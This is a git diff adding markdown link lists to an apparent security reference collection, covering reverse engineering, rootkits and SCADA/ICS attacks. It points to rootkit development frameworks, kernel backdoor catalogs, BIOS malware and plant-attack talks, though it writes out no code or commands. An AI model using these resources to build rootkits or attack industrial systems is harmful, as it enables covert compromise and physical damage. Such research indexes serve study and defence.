+      analysts. Note that we will talk purely about generic anti-debugging and
+      anti-tracing techniques. Specific debugger detection, such as window or
+      processes enumeration, registry scanning, etc. will not be addressed here
+  * [Detecting debuggers by abusing a bad assumption within Windows](http://www.triplefault.io/2017/08/detecting-debuggers-by-abusing-bad.html)
+
+* Tools
+
+  * [ALPHA3](https://code.google.com/p/alpha3/)
+    * ALPHA3 is a tool for transforming any x86 machine code into 100%
+      alphanumeric code with similar functionality. It works by encoding the
+      original code into alphanumeric data and combining this data with a
+      decoder, which is a piece of x86 machine code written specifically to be
+      100% alphanumeric. When run, the decoder converts the data back to the
+      original code, after which it is executed.
+  * [reductio [ad absurdum]](https://github.com/xoreaxeaxeax/reductio)
+    * an exploration of code homeomorphism: all programs can be reduced to the
+      same instruction stream.
+  * [REpsych - Psychological Warfare in Reverse Engineering](https://github.com/xoreaxeaxeax/REpsych/blob/master/README.md)
+    * The REpsych toolset is a proof-of-concept illustrating the generation of
+      images through a program's control flow graph (CFG).
+  * [IDAnt-wanna](https://github.com/strazzere/IDAnt-wanna)
+    * ELF header abuse
+
+### Hardware Reverse Engineering
+
+* See 'Embedded Devices & Hardware Hacking'
+
+### .NET Related
+
+* [Getting Started with CLR MD](https://github.com/Microsoft/clrmd/blob/master/Documentation/GettingStarted.md)
+* [Microsoft.Diagnostics.Runtime.dll(CLR MD)](https://github.com/Microsoft/clrmd)
+
+  * Microsoft.Diagnostics.Runtime.dll (nicknamed "CLR MD") is a process and
+    crash dump introspection library. This allows you to write tools and
+    debugger plugins which can do thing similar to SOS and PSSCOR.
+
+* [Reflexil](https://github.com/sailro/Reflexil)
+
+  * Reflexil is an assembly editor and runs as a plug-in for Red Gate's
+    Reflector, ILSpy and Telerik's JustDecompile. Reflexil is using Mono.Cecil,
+    written by Jb Evain and is able to manipulate IL code and save the modified
+    assemblies to disk. Reflexil also supports C#/VB.NET code injection
+
+### Writeups
+
+* 101s
+
+  * [Defeating ioli with radare2](https://dustri.org/b/defeating-ioli-with-radare2.html)
+
+* Binary & Code Analysis
+
+  * [Byteweight: Learning to Recognize Functions in Binary Code](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-bao.pdf)
+  * [Memalyze: Dynamic Analysis of Memory Access Behavior in Software](http://uninformed.org/?v=all&a=31&t=sumry)
+    * This paper describes strategies for dynamically analyzing an application's
+      memory access behavior. These strategies make it possible to detect when a
+      read or write is about to occur at a given location in memory while an
+      application is executing. An application's memory access behavior can
+      provide additional insight into its behavior. For example, it may be able
+      to provide an idea of how data propagates throughout the address space.
+      Three individual strategies which can be used to intercept memory accesses
+      are described in this paper. Each strategy makes use of a unique method of
+      intercepting memory accesses. These methods include the use of Dynamic
+      Binary Instrumentation (DBI), x86 hardware paging features, and x86
+      segmentation features. A detailed description of the design and
+      implementation of these strategies for 32-bit versions of Windows is
+      given. Potential uses for these analysis techniques are described in
+      detail.
+  * [How to Grow a TREE from CBASS - Interactive Binary Analysis for Security Professionals](https://media.blackhat.com/us-13/US-13-Li-How-to-Grow-a-TREE-Slides.pdf)
+
+* File Formats
+
+  * [Reversing Monkey](http://cheeky4n6monkey.blogspot.com/2015/02/reversing-monkey.html?m=1)
+    * When trying to recover/carve deleted data, some reverse engineering of the
+      file format may be required. Without knowing how the data is stored, we
+      cannot recover the data of interest - be it timestamps, messages, images,
+      video or another type of data. This quick blog post is intended to give
+      some basic tips that have been observed during monkey's latest travels
+      into reverse engineering of file formats. It was done partly as a memory
+      aid/thinking exercise but hopefully other monkeys will find it useful.
+      This post assumes there's no obfuscation/encryption applied to the file
+      and it does not cover reverse engineering malware exes (which is another
+      kettle of bananas).
+  * [How to RE data files?](https://www.reddit.com/r/ReverseEngineering/comments/l8ac0/how_to_re_data_files/)
+
+* Firmware
+
+  * [Reverse Engineering Firmware Primer](https://wiki.securityweekly.com/Reverse_Engineering_Firmware_Primer)
+  * [The Empire Strikes Back Apple – how your Mac firmware security is completely broken](https://reverse.put.as/2015/05/29/the-empire-strikes-back-apple-how-your-mac-firmware-security-is-completely-broken/)
+  * [Hacking Linksys E4200v2 firmware](https://blog.bramp.net/post/2012/01/24/hacking-linksys-e4200v2-firmware/)
+  * [Multiple vulnerabilities found in the Dlink DWR-932B (backdoor, backdoor accounts, weak WPS, RCE ...)](https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html)
+  * [Reverse Engineering Qualcomm Baseband](http://events.ccc.de/congress/2011/Fahrplan/attachments/2022_11-ccc-qcombbdbg.pdf)
+
+* General
+
+  * [Reverse Engineering Flash Memory for Fun and Benefit - BlackHat 2014](https://www.youtube.com/watch?v=E8BSnS4-Kpw)
+  * [Getting access to your own Fitbit data](https://www.cs.ru.nl/bachelorscripties/2016/Maarten_Schellevis___4142616___Getting_access_to_your_own_Fitbit_data.pdf)
+    * This study investigates the possibility of getting direct access to one’s
+      own data, as recorded by a Fitbit Charge HR activity tracker, without
+      going through the Fitbit servers. We captured the firmware image of the
+      Fitbit Charge HR during a firmware update. By analyzing this firmware
+      image we were able to reverse-engineer the cryptographic primitives used
+      by the Fitbit Charge HR activity tracker and recover the authentication
+      protocol. We obtained the cryptographic key that is used in the
+      authentication protocol from the Fitbit Android application. We located a
+      backdoor in version 18.102 of the firmware by comparing it with the latest
+      version of the firmware (18.122). In the latest version of the firmware
+      the backdoor was removed. This backdoor was used to extract the device
+      specific encryption key from the memory of the tracker. While we have not
+      implemented this last step in practice, the device specific encryption key
+      can be used by a Fitbit Charge HR user to obtain his/her fitness data
+      directly from the device.
+  * [Screwdriving. Locating and exploiting smart adult toys](https://www.pentestpartners.com/security-blog/screwdriving-locating-and-exploiting-smart-adult-toys/)
+  * [Hacking travel routers like it’s 1999](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEFCON-25-Mikhail-Sosonkin-Hacking-Travel-Routers-Like-1999.pdf)
+  * [Reverse Engineering IoT Devices](https://iayanpahwa.github.io/Reverse-Engineering-IoT-Devices/)
+  * [How I Reverse Engineered and Exploited a Smart Massager](https://medium.com/@arunmag/how-i-reverse-engineered-and-exploited-a-smart-massager-ee7c9f21bf33)
+  * [Make Confide great again? No, we cannot](http://blog.quarkslab.com/make-confide-great-again-no-we-cannot.html)
+    * RE'ing an electron based "secure communications" app
+  * [The Three Billion Dollar App - Vladimir Wolstencroft -Troopers14](https://www.youtube.com/watch?v=5Duc-uUFzoU)
+    * Talk about reverse engineering SnapChat and Wickr Messaging apps.
+  * [A Practical-Time Attack on the A5/3 Cryptosystem Used in Third Generation GSM Telephony](https://eprint.iacr.org/2010/013)
+    * Abstract: The privacy of most GSM phone conversations is currently
+      protected by the 20+ years old A5/1 and A5/2 stream ciphers, which were
+      repeatedly shown to be cryptographically weak. They will soon be replaced
+      in third generation networks by a new A5/3 block cipher called KASUMI,
+      which is a modified version of the MISTY cryptosystem. In this paper we
+      describe a new type of attack called a sandwich attack, and use it to
+      construct a simple distinguisher for 7 of the 8 rounds of KASUMI with an
+      amazingly high probability of $2^{ -14}$. By using this distinguisher and
+      analyzing the single remaining round, we can derive the complete 128 bit
+      key of the full KASUMI by using only 4 related keys, $2^{26}$ data,
+      $2^{30}$ bytes of memory, and $2^{32}$ time. These complexities are so
+      small that we have actually simulated the attack in less than two hours on
+      a single PC, and experimentally verified its correctness and complexity.
+      Interestingly, neither our technique nor any other published attack can
+      break MISTY in less than the $2^{128}$ complexity of exhaustive search,
+      which indicates that the changes made by the GSM Association in moving
+      from MISTY to KASUMI resulted in a much weaker cryptosystem.
+
+* OS X
+
+  * [Reverse Engineering Mac OS X](http://reverse.put.as/papers/)
+    * Excellent source of papers from 2003-2013 all with a focus on reversing
+      either iOS or OS X.
+
+* Packers
+
+  * [A Brief Examination of Hacking Team’s Crypter: core-packer.](http://ethanheilman.tumblr.com/post/128708937890/a-brief-examination-of-hacking-teams-crypter)
+  * [The Art of Unpacking - Paper](https://www.blackhat.com/presentations/bh-usa-07/Yason/Whitepaper/bh-usa-07-yason-WP.pdf)
+    * Abstract: The main purpose of this paper is to present anti-reversing
+      techniques employed by executable packers/protectors and also discusses
+      techniques and publicly available tools that can be used to bypass or
+      disable this protections. This information will allow researchers,
+      especially, malcode analysts to identify these techniques when utilized by
+      packed malicious code, and then be able decide the next move when these
+      anti-reversing techniques impede successful analysis. As a secondary
+      purpose, the information presented can also be used by researchers that
+      are planning to add some level of protection in their software by slowing
+      down reversers from analyzing their protected code, but of course, nothing
+      will stop a skilled, informed, and determined reverser
+  * [Paper on Manual unpacking of UPX packed executable using Ollydbg and Importrec](http://www.iosrjournals.org/iosr-jce/papers/Vol16-issue1/Version-1/L016117177.pdf)
+
+* PDFs
+
+  * [Advanced PDF Tricks - Ange Albertini, Kurt Pfeifle - Troopers1](https://www.youtube.com/watch?v=k9g9jZdjRcE)
+    * This session is NOT about analyzing exploits but about learning to
+      manipulate PDF contents. Among others:hide/reveal information; remove/add
+      watermark; just suck less about the format. It's an extended session (2
+      hours) to leave the audience time to try by themselves actively. The
+      slides' PDF is entirely hand-written to explain clearly each fact, so the
+      presentation slides themselves will be the study materials.
+
+* Process Hookinng
+
+  * [Software Hooking methods reveiw(2016)](https://www.blackhat.com/docs/us-16/materials/us-16-Yavo-Captain-Hook-Pirating-AVs-To-Bypass-Exploit-Mitigations-wp.pdf)
+  * [PolyHook](https://www.codeproject.com/articles/1100579/polyhook-the-cplusplus-x-x-hooking-library)
+
+* Protocols
+
+  * [Somfy Smoove Origin RTS Protocol](https://pushstack.wordpress.com/somfy-rts-protocol/)
+    * This document describes the Somfy RTS protocol as used by the “Somfy
+      Smoove Origin RTS”. Most information in this document is based on passive
+      observation of the data send by the Smoove Origin RTS remote, and thus can
+      be inaccurate or incorrect!
+  * [Reverse Engineering The eQSO Protocol](https://gist.github.com/anonymous/7a9d713e61ba990a3a17)
+    * Today I reverse engineered the eQSO protocol. If you didn't know, eQSO is
+      a small program that allows radio amateurs to talk to each other online.
+      Sadly this program isn't as popular as it used to be (Well, neither is the
+      radio).
+  * [Cyber Necromancy - Reverse engineering dead protocols - Defcamp 2014 ](https://www.youtube.com/watch?v=G0v2FO2Ru0w&index=6&list=PLnwq8gv9MEKgSryzYIFhpmCcqnVzdUWfH)
+  * [Reverse Engineering of Proprietary Protocols, Tools and Techniques - Rob Savoye - FOSDEM 2009 ](https://www.youtube.com/watch?v=t3s-mG5yUjY)
+    * This talk is about reverse engineering a proprietary network protocol, and
+      then creating my own implementation. The talk will cover the tools used to
+      take binary data apart, capture the data, and techniques I use for
+      decoding unknown formats. The protocol covered is the RTMP protocol used
+      by Adobe flash, and this new implementation is part of the Gnash project.
+  * [Netzob](http://www.netzob.org/)
+    * Originaly, the development of Netzob has been initiated to support
+      security auditors and evaluators in their activities of modeling and
+      simulating undocumented protocols. The tool has then been extended to
+      allow smart fuzzing of unknown protocol.
+  * [Netzob Documentation](http://netzob.readthedocs.org/en/latest/overview/index.html)
+
+* Satellites
+
+  * [SATCOM Terminals Hacking by Air, Sea, and Land - Black Hat USA 2014](https://www.youtube.com/watch?v=tRHDuT__GoM)
+
+* Windows
+
+  * [Windows for Reverse Engineers](http://www.cse.tkk.fi/fi/opinnot/T-110.6220/2014_Reverse_Engineering_Malware_AND_Mobile_Platform_Security_AND_Software_Security/luennot-files/T1106220.pdf)
+  * [Introduction to Reverse Engineering Win32 Applications](http://uninformed.org/?v=all&a=7&t=sumry)
+    * During the course of this paper the reader will be (re)introduced to many
+      concepts and tools essential to understanding and controlling native Win32
+      applications through the eyes of Windows Debugger (WinDBG). Throughout,
+      WinMine will be utilized as a vehicle to deliver and demonstrate the
+      functionality provided by WinDBG and how this functionality can be
+      harnessed to aid the reader in reverse engineering native Win32
+      applications. Topics covered include an introductory look at IA-32
+      assembly, register significance, memory protection, stack usage, various
+      WinDBG commands, call stacks, endianness, and portions of the Windows API.
+      Knowledge gleaned will be used to develop an application designed to
+      reveal and/or remove bombs from the WinMine playing grid.
+  * [Reverse Engineering Windows AFD.sys](https://recon.cx/2015/slides/recon2015-20-steven-vittitoe-Reverse-Engineering-Windows-AFD-sys.pdf)
+  * [Event Tracing for Windows and Network Monitor](http://blogs.technet.com/b/netmon/archive/2009/05/13/event-tracing-for-windows-and-network-monitor.aspx)
+    * "Event Tracing for Windows, (ETW), has been around for quite a while now
+      as it was introduced in Windows 2000. It's basically instrumented logging
+      that describes what a component is doing. Conceptually, it’s something
+      like the proverbial printf("here1") concept used by programmers, but it is
+      present in retail builds. When you enable logging in a component the
+      result is an ETL (Event Trace Log) file. What’s new is that that Network
+      Monitor can read any ETL file. And with the supplied parsers many network
+      oriented ETW providers can be decoded."
+  * [Improving Automated Analysis of Windows x64 Binaries](http://uninformed.org/?v=all&a=18&t=sumry)
+    * As Windows x64 becomes a more prominent platform, it will become necessary
+      to develop techniques that improve the binary analysis process. In
+      particular, automated techniques that can be performed prior to doing code
+      or data flow analysis can be useful in getting a better understanding for
+      how a binary operates. To that point, this paper gives a brief explanation
+      of some of the changes that have been made to support Windows x64
+      binaries. From there, a few basic techniques are illustrated that can be
+      used to improve the process of identifying functions, annotating their
+      stack frames, and describing their exception handler relationships. Source
+      code to an example IDA plugin is also included that shows how these
+      techniques can be implemented.
+  * [Microsoft Patch Analysis for Exploitation](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t111-microsoft-patch-analysis-for-exploitation-stephen-sims)
+    * Since the early 2000's Microsoft has distributed patches on the second
+      Tuesday of each month. Bad guys, good guys, and many in-between compare
+      the newly released patches to the unpatched version of the files to
+      identify the security fixes. Many organizations take weeks to patch and
+      the faster someone can reverse engineer the patches and get a working
+      exploit written, the more valuable it is as an attack vector. Analysis
+      also allows a researcher to identify common ways that Microsoft fixes bugs
+      which can be used to find 0-days. Microsoft has recently moved to
+      mandatory cumulative patches which introduces complexity in extracting
+      patches for analysis. Join me in this presentation while I demonstrate the
+      analysis of various patches and exploits, as well as the best-known method
+      for modern patch extraction.
+
+* Wireless
+
+  * [Reverse engineering radio weather station](http://blog.atx.name/reverse-engineering-radio-weather-station/)
+  * [You can ring my bell! Adventures in sub-GHz RF land…](http://adamsblog.aperturelabs.com/2013/03/you-can-ring-my-bell-adventures-in-sub.html)
+  * [Reverse engineering walk through; guy REs alarm system from shelf to replay](https://www.reddit.com/r/ReverseEngineering/comments/1hb7oy/a_series_about_basics_of_hardware_reverse/)
+    * [Part 1](http://cybergibbons.com/reverse-engineering-a-wireless-burglar-alarm-system-part-1/)
+    * [Part 2](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-2/)
+    * [Part 3](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-3/)
+    * [Part 4](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-4/)
+    * [Part 5](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-5/)
+    * [Part 6](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-6/)
+    * [Part 7](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-7/)
+    * [Part 8](http://cybergibbons.com/uncategorized/reverse-engineering-a-wireless-burglar-alarm-part-8/)
+  * [Blackbox Reversing an Electric Skateboard Wireless Protocol ](https://blog.lacklustre.net/posts/Blackbox_Reversing_an_Electric_Skateboard_Wireless_Protocol/)
+  * [Reverse Engineering a 433MHz Motorised Blind RF Protocol](https://nickwhyte.com/post/2017/reversing-433mhz-raex-motorised-rf-blinds/)
+  * [Flipping Bits and Opening Doors: Reverse Engineering the Linear Wireless Security DX Protocol](https://duo.com/blog/flipping-bits-and-opening-doors-reverse-engineering-the-linear-wireless-security-dx-protocol)
diff --git a/source/Rootkits.md b/source/Rootkits.md
new file mode 100644
index 0000000..c2d3fd5
--- /dev/null
+++ b/source/Rootkits.md
@@ -0,0 +1,233 @@
+# Rootkits
+
+### TOC
+
+* [Cull](#cull)
+* [Developing](#dev)
+* [Identifying/Defending Against](#id)
+* [Talks/Videos](#talks)
+* [Writeups](#writeups)
+* [Papers](#papers)
+* [Tools](#tools)
+
+### Sort
+
+* [Homesite](https://trmm.net/EFI)
+* [Talk at CCC31](https://www.youtube.com/watch?v=5BrdX7VdOr0)
+
+### Developing
+
+* [Android Rootkit](https://github.com/hiteshd/Android-Rootkit)
+
+* [Masochist](https://github.com/squiffy/Masochist)
+
+  * Masochist is a framework for creating XNU based rootkits. Very useful in OS
+    X and iOS security research.
+
+* [Using Kernel Rootkits to conceal infected MBR](https://github.com/MalwareTech/FakeMBR/)
+
+* [Hypervisor](https://github.com/ainfosec/more)
+
+* [Suterusu](https://github.com/mncoppola/suterusu)
+
+* Windows Rootkits(excellent writeup/introduction to windows rootkits)
+
+  * [Part 1](http://www.programdevelop.com/5408113/)
+  * [Part 2](http://www.programdevelop.com/5409574/)
+  * [Part 3](http://www.programdevelop.com/5408212/)
+
+* [Crafting Mac OS Rootkits](https://www.zdziarski.com/blog/wp-content/uploads/2017/02/Crafting-macOS-Root-Kits.pdf)
+
+* [WindowsRegistryRootkit](https://github.com/Cr4sh/WindowsRegistryRootkit)
+
+  * Kernel rootkit, that lives inside the Windows registry value data. By
+    Oleksiuk Dmytro (aka Cr4sh)
+  * Rootkit uses the zero day vulnerability in win32k.sys (buffer overflow in
+    function win32k!bInitializeEUDC()) to get the execution at the OS startup.
+
+### Identifiying/Defending Against
+
+* [Killing Rootkits](http://blog.ioactive.com/2014/09/killing-rootkit.html)
+
+### Talks/Videos
+
+* [BoutiqueKit: Playing WarGames with Expensive Rootkits and Malware- Defcon 21](https://www.youtube.com/watch?v=gKUleWyfut0)
+
+* [Persistent, Stealthy, Remote-controlled Dedicated Hardware Malware \* [30c3]](https://www.youtube.com/watch?v=Ck8bIjAUJgE)
+
+* [Intel Management Engine Secrets by Igor Skochinsky](https://www.youtube.com/watch?v=Y2_-VXz9E-w)
+
+* [MoRE Shadow Walker : TLB - splitting on Modern x86](https://www.youtube.com/watch?v=XU1uNGZ7HnY)
+
+  * This presentation provides a cohesive overview of the work performed by AIS,
+    Inc. on the DARPA CFT MoRE effort. MoRE was a 4-month effort which examined
+    the feasibility of utilizing TLB splitting as a mechanism for periodic
+    measurement of dynamically changing binaries. The effort created a
+    proof-of-concept system to split the TLB for target applications, allowing
+    dynamic applications to be measured and can detect code corruption with low
+    performance overhead.
+
+* [How Many Million BIOSes Would you Like to Infect?](http://conference.hitb.org/hitbsecconf2015ams/sessions/how-many-million-bioses-would-you-like-to-infect/)
+
+  * This talk is going to be all about how the automation of BIOS vulnerability
+    exploitation and leveraging of built-in capabilities can yield highly
+    portable UEFI firmware malware. And how millions of systems will be
+    vulnerable for years, because no one cares enough to patch the BIOS bugs
+    weve found. So you think youre doing OPSEC right, right? Youre going to
+    crazy lengths to protect yourself, reinstalling your main OS every month, or
+    using a privacy-conscious live DVD like TAILS. Guess what? BIOS malware
+    doesnt care! BIOS malware doesnt give a shit
+
+* [Measurement of Running Executables](http://vimeo.com/81335517)
+
+* [From Kernel to VM](https://www.youtube.com/watch?v=FSw8Ff1SFLM)
+
+  * [Description from stormeh on reddit](https://www.reddit.com/r/rootkit/comments/25hsc4/jacob_i_torrey_from_kernel_to_vmm/):
+    Although it's not directly a lecture about rootkit development, the topics
+    discussed are very much of interest: hardware virtualization, page table and
+    TLB manipulation, hypervisors and privilege levels below ring 0, etc. The
+    speaker does also go on to mention how prior rootkits such as Blue Pill and
+    Shadow Walker leveraged these features, as well as defensive technologies
+    such as PaX.
+  * [Slides](http://jacobtorrey.com/VMMLecture.pdf)
+
+* [All Your Boot Are Belong To Us - Intel Security](https://cansecwest.com/slides/2014/AllYourBoot_csw14-intel-final.pdf)
+* [Concepts for the Steal the Windows Rootkit (The Chameleon Project) Joanna Rutkowska2003](http://repo.hackerzvoice.net/depot_madchat/vxdevl/avtech/Concepts%20for%20the%20Stealth%20Windows%20Rootkit%20%28The%20Chameleon%20Project%29.pdf)
+
+### Writeups
+
+* [Shadow Walker - Raising the Bar for Rootkit detection - BH 2005](https://www.blackhat.com/presentations/bh-jp-05/bh-jp-05-sparks-butler.pdf)
+
+* [Rise of the dual architecture usermode rootkit](http://www.malwaretech.com/2013/06/rise-of-dual-architecture-usermode.html)
+
+* [Killing the Rootkit - Shane Macaulay](http://blog.ioactive.com/2014/09/killing-rootkit.html)
+
+  * Cross-platform, cross-architecture DKOM detection
+
+* [Raising The Bar For Windows Rootkit Detection - Phrack](http://www.phrack.org/issues/63/8.html)
+
+* [TLB Synchronization (Split TLB)](http://uninformed.org/index.cgi?v=6&a=1&p=21)
+
+* [Komodia Rootkit Writeupn](https://gist.github.com/Wack0/f865ef369eb8c23ee028)
+
+  * Komodia rootkit findings by @TheWack0lian
+
+* [Using Kernel Rootkits to conceal infected MBR](http://www.malwaretech.com/2015/01/using-kernel-rootkits-to-conceal.html)
+
+* [MoRE Shadow Walker : TLB - splitting on Modern x86](https://www.blackhat.com/docs/us-14/materials/us-14-Torrey-MoRE-Shadow-Walker-The-Progression-Of-TLB-Splitting-On-x86-WP.pdf)
+
+  * MoRE, or Measurement of Running Executables, was a DARPA Cyber Fast Track
+    effort to study the feasibility of utilizi ng x86 translation look - aside
+    buffer (TLB) splitting techniques for realizing periodic measurements of
+    running and dynamically changing applications. It built upon PaX, which used
+    TLB splitting to emulate the no - execute bit and Shadow Walker, a memory
+    hidi ng rootkit ; both designed for earlier processor architectures. MoRE
+    and MoRE Shadow Walker are a defensive TLB splitting system and a prototype
+    memory hiding rootkit for the current Intel i - series processors
+    respectively demonstrating the evolution of th e x86 architecture and how
+    its complexity allows software to effect the apparent hardware architecture.
+
+* [Smart TV Security - #1984 in 21 st century](https://cansecwest.com/slides/2013/SmartTV%20Security.pdf)
+
+  * This talk is more about security bugs and rootkits than about firmware for
+    TVs. This talk more covers rootkits than security bugs and exploitation
+    thereof, as theyre not different to traditional techniques. This talk is
+    about general security issues of all Smart TV vendors.
+
+* [Advanced Bootkit Techniques on Android](http://www.syscan360.org/slides/2014_EN_AdvancedBootkitTechniquesOnAndroid_ChenZhangqiShendi.pdf)
+
+* [Analyzing the Jynx rootkit and the LD-Preload technique](http://volatility-labs.blogspot.com/2012/09/movp-24-analyzing-jynx-rootkit-and.html)
+
+  * In this post I will analyze the Jynx rootkit using Volatilitys new Linux
+    features.
+
+* [A Real SMM Rootkit: Reversing and Hooking BIOS SMI Handlers - Filip Wecherowski](http://phrack.org/issues/66/11.html#article)
+
+  * The research provided in this paper describes in details how to reverse
+    engineer and modify System Management Interrupt (SMI) handlers in the BIOS
+    system firmware and how to implement and detect SMM keystroke logger. This
+    work also presents proof of concept code of SMM keystroke logger that uses
+    I/O Trap based keystroke interception and a code for detection of such
+    keystroke logger.
+
+* [Revisiting Mac OS X Kernel Rootkits - fG! <phrack@put.as>-](http://phrack.org/issues/69/7.html)
+
+* [Android platform based linux kernel rootkit - dong-hoon you](http://www.phrack.org/issues/68/6.html)
+
+* [Stealth hooking : Another way to subvert the Windows kernel - mxatone and ivanlef0u](http://phrack.org/issues/65/4.html#article)
+
+* [Kernel Rootkit Experiences - stealth](http://phrack.org/issues/61/14.html)
+
+* [NTIllusion: A portable Win32 userland rootkit - Kdm](http://phrack.org/issues/62/12.html)
+
+* [Linux on-the-fly kernel patching without LKM - sd, devik](http://phrack.org/issues/58/7.html)
+
+### Papers
+
+* [A Catalog of Windows Local Kernel-mode Backdoors](http://uninformed.org/?v=all&a=35&t=sumry)
+
+  * This paper presents a detailed catalog of techniques that can be used to
+    create local kernel-mode backdoors on Windows. These techniques include
+    function trampolines, descriptor table hooks, model-specific register hooks,
+    page table modifications, as well as others that have not previously been
+    described. The majority of these techniques have been publicly known far in
+    advance of this paper. However, at the time of this writing, there appears
+    to be no detailed single point of reference for many of them. The intention
+    of this paper is to provide a solid understanding on the subject of local
+    kernel-mode backdoors. This understanding is necessary in order to encourage
+    the thoughtful discussion of potential countermeasures and perceived
+    advancements. In the vein of countermeasures, some additional thoughts are
+    given to the common misconception that PatchGuard, in its current design,
+    can be used to prevent kernel-mode rootkits.
+
+* [Implementation and Implications of a Stealth Hard-Drive Backdoor](https://www.ibr.cs.tu-bs.de/users/kurmus/papers/acsac13.pdf)
+
+  * Modern workstations and servers implicitly trust hard disks to act as
+    well-behaved block devices. This paper analyzes the catastrophic loss of
+    security that occurs when hard disks are not trustworthy. First, we show
+    that it is possible to compromise the firmware of a commercial
+    over-the-shelf hard drive, by resorting only to public information and
+    reverse engineering. Using such a compromised firmware, we present a stealth
+    rootkit that replaces arbitrary blocks from the disk while they are written,
+    providing a data replacement back- door . The measured performance overhead
+    of the compromised disk drive is less than 1% compared with a normal,
+    non-malicious disk drive. We then demonstrate that a re- mote attacker can
+    even establish a communication channel with a compromised disk to infiltrate
+    commands and to ex-filtrate data. In our example, this channel is
+    established over the Internet to an unmodified web server that relies on the
+    compromised drive for its storage, passing through the original webserver,
+    database server, database storage engine, filesystem driver, and block
+    device driver. Additional experiments, performed in an emulated disk-drive
+    environment, could automatically extract sensitive data such as /etc/shadow
+    (or a secret key file) in less than a minute. This paper claims that the
+    diffculty of implementing such an at- tack is not limited to the area of
+    government cyber-warfare; rather, it is well within the reach of moderately
+    funded criminals, botnet herders and academic researchers.
+
+* [futo](http://uninformed.org/?v=all&a=17&t=sumry)
+
+  * Since the introduction of FU, the rootkit world has moved away from
+    implementing system hooks to hide their presence. Because of this change in
+    offense, a new defense had to be developed. The new algorithms used by
+    rootkit detectors, such as BlackLight, attempt to find what the rootkit is
+    hiding instead of simply detecting the presence of the rootkit's hooks. This
+    paper will discuss an algorithm that is used by both Blacklight and IceSword
+    to detect hidden processes. This paper will also document current weaknesses
+    in the rootkit detection field and introduce a more complete stealth
+    technique implemented as a prototype in FUTo.
+
+* [Introducing Ring -3 Rootkits](http://invisiblethingslab.com/resources/bh09usa/Ring%20-3%20Rootkits.pdf)
+
+* [Pitfalls of virtual machine introspection on modern hardware](https://www.acsac.org/2014/workshops/mmf/Tamas%20Lengyel-Pitfalls%20of%20virtual%20machine%20introspection%20on%20modern%20hardware.pdf)
+
+* [Security Evaluation of Intel's Active Management Technology](http://people.kth.se/~maguire/DEGREE-PROJECT-REPORTS/100402-Vassilios_Ververis-with-cover.pdf)
+
+### Tools
+
+* [DragonKing Rootkit](https://github.com/mgrube/DragonKing)
+
+  * This is an open source rootkit created for a class taught on Rootkit Design.
+    This rootkit hides by hooking the system call table and using an agent to do
+    interactive manipulation in userland.
+
+* [GPU rootkit PoC by Team Jellyfish](https://github.com/x0r1/jellyfish)
diff --git a/source/SCADA.md b/source/SCADA.md
new file mode 100644
index 0000000..8c56e06
--- /dev/null
+++ b/source/SCADA.md
@@ -0,0 +1,168 @@
+# SCADA/Industrial Control Systems
+
+### ToC
+
+* [General](#general)
+* [Articles/Blogposts](#articles)
+* [Talks/Presentations](#talks)
+* [Tools](#tools)
+* [Simulators](#sim)
+* [Testing Tools](#test)
+* [Honeypots](#honey)
+
+### General
+
+* [Introduction to Attacking ICS/SCADA Systems for Penetration Testers -GDS Sec](http://blog.gdssecurity.com/labs/2017/5/17/introduction-to-attacking-icsscada-systems-for-penetration-t.html)
+* [Different Type of SCADA](http://scadastrangelove.blogspot.com/2014/10/different-type-of-scada.html)
+* [awesome-industrial-control-system-security](https://github.com/hslatman/awesome-industrial-control-system-security)
+* [Cassandra coefficient and ICS cyber – is this why the system is broken](http://www.controlglobal.com/blogs/unfettered/cassandra-coefficient-and-ics-cyber-is-this-why-the-system-is-broken/)
+* [Remote Physical Damage 101 - Bread and Butter Attacks](https://www.blackhat.com/docs/us-15/materials/us-15-Larsen-Remote-Physical-Damage-101-Bread-And-Butter-Attacks.pdf)
+* [Sinking container ships by hacking load plan software](https://www.pentestpartners.com/security-blog/sinking-container-ships-by-hacking-load-plan-software/)
+* [SCADA Strangelove or: How I Learned to Start Worrying and Love Nuclear Plants](https://www.youtube.com/watch?v=o2r7jbwTv6w)
+
+  * Modern civilization unconditionally depends on information systems. It is
+    paradoxical but true that ICS/SCADA systems are the most insecure systems in
+    the world. From network to application, SCADA is full of configuration
+    issues and vulnerabilities. During our report, we will demonstrate how to
+    obtain full access to a plant via: a sniffer and a packet generator; FTP and
+    Telnet; Metasploit and oslq; a webserver and a browser; About 20 new
+    vulnerabilities in common SCADA systems including Simatic WinCC will be
+    revealed.
+
+* [Rocking the Pocket Book: Hacking Chemical Plant for Competition and Extortion - Marina Krotofil - Jason Larsen](https://www.youtube.com/watch?v=AL8L76n0Q9w)
+
+  * The appeal of hacking a physical process is dreaming about physical damage
+    attacks lighting up the sky in a shower of goodness. Let’s face it, after
+    such elite hacking action nobody is going to let one present it even at a
+    conference like DEF CON. As a poor substitute, this presentation will get as
+    close as using a simulated plant for Vinyl Acetate production for
+    demonstrating a complete attack, from start to end, directed at persistent
+    economic damage to a production site while avoiding attribution of
+    production loss to a cyber-event. Such an attack scenario could be useful to
+    a manufacturer aiming at putting competitors out of business or as a strong
+    argument in an extortion attack. Exploiting physical process is an exotic
+    and hard to develop skill which have so far kept a high barrier to entry.
+    Therefore real-world control system exploitation has remained in the hands
+    of a few. To help the community mastering new skills we have developed „Damn
+    Vulnerable Chemical Process“ – first open source framework for
+    cyber-physical experimentation based on two realistic models of chemical
+    plants. Come to the session and take your first master class on complex
+    physical hacking.
+
+### EDIFACT
+
+* [EDIFACT - Wikipedia](https://en.wikipedia.org/wiki/EDIFACT)
+* [SMDG.org](http://www.smdg.org/)
+
+  * SMDG develops and promotes UN/EDIFACT EDI-messages for the Maritime Industry
+    and is an official Global User Group, recognised by the UN/EDIFACT Board.
+
